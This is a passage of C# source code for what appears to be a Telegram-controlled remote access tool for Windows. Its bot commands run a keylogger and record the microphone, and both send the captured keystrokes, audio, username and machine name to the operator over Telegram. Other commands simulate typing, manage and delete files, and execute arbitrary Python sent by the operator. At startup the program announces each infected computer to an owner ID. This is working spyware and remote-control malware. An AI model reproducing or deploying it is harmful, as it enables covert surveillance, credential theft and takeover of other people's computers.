                MayHaveNoArgs = false,
                Description = "Send text input",
                Example = "/sendtext hello world",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //KEYLOG
            commands.Add(new BotCommand
            {
                Command = "/keylog",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (keylog)
                        {
                            keylog = false;
                            return;
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Keylog started!", replyToMessageId: update.Message.MessageId);
                        keylog = true;

                        StringBuilder mappedKeys = new StringBuilder();
                        StringBuilder unmappedKeys = new StringBuilder();
                        List<uint> LastKeys = new List<uint>();
                        List<uint> shit = new List<uint>();
                        while (keylog)
                        {
                            shit.Clear();
                            bool hasAtLeastOneKey = false;
                            for (uint i = 0; i < 256; i++)
                            {
                                int state = WinAPI.GetAsyncKeyState(i);
                                if (state != 0)
                                {
                                    shit.Add(i);
                                    hasAtLeastOneKey = true;
                                }
                            }
                            if (!hasAtLeastOneKey && LastKeys.Count > 0)
                            {
                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
                                for (int i = 0; i < LastKeys.Count; i++)
                                {
                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
                                    if ((int)mappedKeycode == 0)
                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
                                    else
                                        mappedKeys.Append(mappedKeycode + ";");

                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
                                }
                                mappedKeys.Append(" ");
                                unmappedKeys.Append(" ");
                                LastKeys.Clear();
                                continue;
                            }
                            foreach (uint v in shit)
                            {
                                if (!LastKeys.Contains(v))
                                {
                                    LastKeys.Add(v);
                                }
                            }

                        }
                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                        {
                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
                            streamWriter.WriteLine("#Mapped keylog:");
                            streamWriter.WriteLine(mappedKeys.ToString());
                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
                            streamWriter.WriteLine(unmappedKeys.ToString());
                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                            streamWriter.Close();
                        }
                        Bot.SendTextMessageAsync(update.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());

                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                        {
                            Bot.SendDocumentAsync(update.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                        }
                    });
                },
                Description = "Keylog starts and ends with no args."
            });

            //RECORD AUDIO
            commands.Add(new BotCommand
            {
                Command = "/audio",
                CountArgs = 1,
                Description = "Record audio from microphone for given amount of secs or start and stop as a first argument.",
                Example = "/audio 50",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (model.Args[0].ToLower() == "start")
                            {
                                if (!doRecord)
                                {
                                    doRecord = true;
                                    waveIn = new WaveInEvent()
                                    {
                                        WaveFormat = new WaveFormat(44100, 1)
                                    };

                                    waveFileWriter = new WaveFileWriter("record.wav", waveIn.WaveFormat);

                                    waveIn.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
                                    {
                                        if (waveFileWriter != null)
                                        {
                                            waveFileWriter.Write(args.Buffer, 0, args.BytesRecorded);
                                            waveFileWriter.Flush();
                                        }
                                    });

                                    waveIn.StartRecording();
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
                                }
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
                                }
                                return;
                            }
                            if (model.Args[0].ToLower() == "stop")
                            {
                                if (doRecord)
                                {
                                    doRecord = false;
                                    waveIn.StopRecording();
                                    Task.Delay(200).Wait();

                                    waveFileWriter.Close();
                                    Task.Delay(200).Wait();

                                    using (FileStream fs = new FileStream("record.wav", FileMode.Open))
                                    {
                                        InputOnlineFile file = new InputOnlineFile(fs);
                                        Bot.SendAudioAsync(update.Message.Chat.Id, file, replyToMessageId: update.Message.MessageId).Wait();

                                    }
                                    System.IO.File.Delete("record.wav");
                                }
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Recording isn't started yet!", replyToMessageId: update.Message.MessageId);
                                }
                                return;
                            }

                            int time = int.Parse(model.Args[0]);

                            WaveInEvent waveIn2 = new WaveInEvent();

                            waveIn2.WaveFormat = new WaveFormat(44100, 1);
                            WaveFileWriter waveFileWriter2 = new WaveFileWriter("record.wav", waveIn2.WaveFormat);

                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
                                    waveFileWriter2.Flush();
                                }
                            });
                            waveIn2.RecordingStopped += new EventHandler<StoppedEventArgs>((object sender, StoppedEventArgs args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Dispose();
                                    waveFileWriter2.Close();
                                }
                                if (waveIn2 != null)
                                {
                                    waveIn2.Dispose();
                                }
                            });

                            waveIn2.StartRecording();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording", replyToMessageId: update.Message.MessageId);

                            Task.Delay(time * 1000).Wait();
                            waveIn2.StopRecording();
                            Task.Delay(200).Wait();
                            waveFileWriter2.Close();
                            Task.Delay(200).Wait();

                            using (FileStream fs = new FileStream("record.wav", FileMode.Open))
                            {
                                Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(fs), replyToMessageId: update.Message.MessageId).Wait();
                            }
                            System.IO.File.Delete("record.wav");


                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                }
            });

            //GET ALL COMMANDS
            commands.Add(new BotCommand
            {
                Command = "/commands",
                Description = "Get all commands list sorted by alphabet",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
                        foreach (BotCommand command in commands.OrderBy(x => x.Command))
                        {
                            commandsList.AppendLine(command.Command);
                        }
                        commandsList.AppendLine("\nHold to copy command");
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, commandsList.ToString(), replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //DELETE FILE
            commands.Add(new BotCommand
            {
                Command = "/deletefile",
                MayHaveNoArgs = false,
                Description = "Delete file in path",
                Example = "/deletefile hello world.txt",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.RawArgs))
                            {
                                System.IO.File.Delete(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist.", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //CREATE FOLDER
            commands.Add(new BotCommand
            {
                Command = "/createfolder",
                MayHaveNoArgs = false,
                Description = "Create folder.",
                Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (!Directory.Exists(model.RawArgs))
                            {
                                Directory.CreateDirectory(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder already exists!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //DELETE FOLDER
            commands.Add(new BotCommand
            {
                Command = "/deletefolder",
                MayHaveNoArgs = false,
                Description = "Delete folder.",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (Directory.Exists(model.RawArgs))
                            {
                                Directory.Delete(model.RawArgs);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //RENAME FILE
            commands.Add(new BotCommand
            {
                Command = "/renamefile",
                Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
                Example = "/renamefile C:\\Users\\User\\Documents\\oldname.txt newname.txt",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                            {
                                string fileToRename = Path.GetFullPath(model.Args[0]);
                                string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
                                System.IO.File.Move(fileToRename, newFileName);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
                                if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //COPY FILE
            commands.Add(new BotCommand
            {
                Command = "/copyfile",
                CountArgs = 2,
                Description = "Copy file. First argument is file path (full or realtive), second is folder path",
                Example = "/copyfile hello.txt C:\\Users\\User\\Documents",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
                            {
                                System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
                                if (!Directory.Exists(model.Args[1]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //PYTHON COMMANDS EXECUTING
            commands.Add(new BotCommand
            {
                Command = "/py",
                Description = "Execute python expression or file. To execute file send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                Example = "/py print('Hello World')",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (update.Message.ReplyToMessage == null || update.Message.ReplyToMessage.Type != MessageType.Document)
                            {
                                if (model.Args.Length < 1)
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                                MemoryStream pyOutput = new MemoryStream();
                                var pyStream = new MemoryStream();
                                pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

                                pythonEngine.Execute(model.RawArgs, pythonScope);
                                pyStream.Position = 0;

                                if (pyStream.Length > 0)
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{new StreamReader(pyStream).ReadToEnd()}", replyToMessageId: update.Message.MessageId);
                                }
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
                                }
                                pyStream.Position = 0;
                                pyStream.Close();
                                return;
                            }
                            if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                            {
                                if (!update.Message.ReplyToMessage.Document.FileName.Contains(".py"))
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not python script!", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                                MemoryStream outputStream = new MemoryStream();
                                var scriptFileStream = System.IO.File.Create("UserScript.py");
                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                                var file = Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId).Result;
                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                scriptFileStream.Close();

                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);

                                outputStream.Position = 0;

                                string outputText = new StreamReader(outputStream).ReadToEnd();

                                if (outputText.Length > 0)
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                else
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);

                                System.IO.File.Delete("UserScript.py");
                                outputStream.Close();
                            }

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                }
            });

            //PYTHON CLEAR SCOPE
            commands.Add(new BotCommand
            {
                Command = "/pyclearscope",
                CountArgs = 0,
                Description = "Clear python execution scope.",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        pythonScope = pythonEngine.CreateScope();
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Cleared!", replyToMessageId: update.Message.MessageId);
                    });
                }

            });


            #endregion


            for (; ; )
            {
                try
                {
                    Run().Wait();
                }
                catch (Exception ex)
                {
                    Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                }
            }
        }

        static async void ReportError(Update update, Exception exception)
        {
            if (Bot != null)
            {
#if DEBUG
                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: update.Message.MessageId);
#else
                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: " + exception.Message, replyToMessageId: update.Message.MessageId);
#endif
            }
        }



        static async Task Run()
        {
            if (OwnerId != null)
            {
                await Bot.SendTextMessageAsync(OwnerId,
                    $"🖥Computer online! \n\n" +
                    $"Username: *{Environment.UserName}*\n" +
                    $"PC name: *{Environment.MachineName}*\n\n" +

                    $"OS: {GetWindowsVersion()}",
                    ParseMode.Markdown);
            }
            var offset = 0;

            while (true)
            {
                var updates = await Bot.GetUpdatesAsync(offset);
                if (updates.Length != 0)
                    offset = updates.Last().Id + 1;

                UpdateWorker(updates).Wait();

                Task.Delay(100).Wait();
            }

        }


        public static async Task UpdateWorker(Update[] Updates)
        {

            foreach (var update in Updates)
            {
                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
                {
                    continue;
                }
                if (update.Message.Text != null && update.Message.Text.Contains("@" + Bot.GetMeAsync().Result.Username))
                {
                    update.Message.Text = update.Message.Text.Substring(0,
                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
                        update.Message.Text.Substring(
                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
                        ("@" + Bot.GetMeAsync().Result.Username).Length);
                }

                if (update.Message.Caption != null && update.Message.Caption.Contains("@" + Bot.GetMeAsync().Result.Username))
                {
                    update.Message.Caption = update.Message.Text.Substring(0,
                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
                        update.Message.Caption.Substring(
                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
                        ("@" + Bot.GetMeAsync().Result.Username).Length);
                }

                BotCommandModel model;
                if (update.Message.Type == MessageType.Text)
                {
                    model = BotCommand.Parse(update.Message.Text);
                }
                else
                {
                    model = BotCommand.Parse(update.Message.Caption);
                }
                if (model != null)
                {
                    foreach (var cmd in commands)
                    {
                        if (cmd.Command == model.Command)
                        {

                            if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
                            {
                                await Task.Run(() =>
                                {
                                    try
                                    {
                                        cmd.Execute.Invoke(model, update);
                                    }
                                    catch (Exception ex)
                                    {
                                        ReportError(update, ex);
                                    }
                                });

                            }
                            else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
                            {

                                await Task.Run(() =>
                                {
                                    try
                                    {
                                        cmd.Execute.Invoke(model, update);
                                    }
                                    catch (Exception ex)
                                    {
                                        ReportError(update, ex);
                                    }
                                });
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
                                     $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
                            }
                        }
                    }
                }

            }
        }


        static string GetWindowsVersion()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                string prodName = key.GetValue("ProductName") as string;
                string csdVer = key.GetValue("CSDVersion") as string;

                return prodName + csdVer;
            }
            return "";
        }
    }
}
